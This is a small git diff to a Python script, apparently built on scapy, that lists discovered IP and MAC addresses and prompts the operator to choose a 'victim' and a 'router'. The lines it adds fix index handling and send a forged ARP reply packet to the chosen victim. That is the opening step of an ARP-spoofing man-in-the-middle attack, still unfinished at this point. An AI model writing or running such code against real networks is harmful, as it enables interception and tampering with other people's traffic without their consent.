@@ -14,15 +14,15 @@ for i in range (len(ip)):
     print(ip[i], " = ", mac[i])
 
 print("Chose a victim:")
-victim = input()
+victim = int(input())
 print("Chose the router:")
-router = input()
+router = int(input())
 
-print ("victim ip: ", ip[victim])
-print ("victim mac: ", mac[victim])
+print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
 
-print ("router ip: ", ip[router])
-print ("router mac: ", mac[router])
+print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
+
+arply = srp((Ether(dst=(mac[victim-1]))/ARP(op = 2,pdst=(ip[victim-1]))), timeout=3, verbose=0)
 
     
     
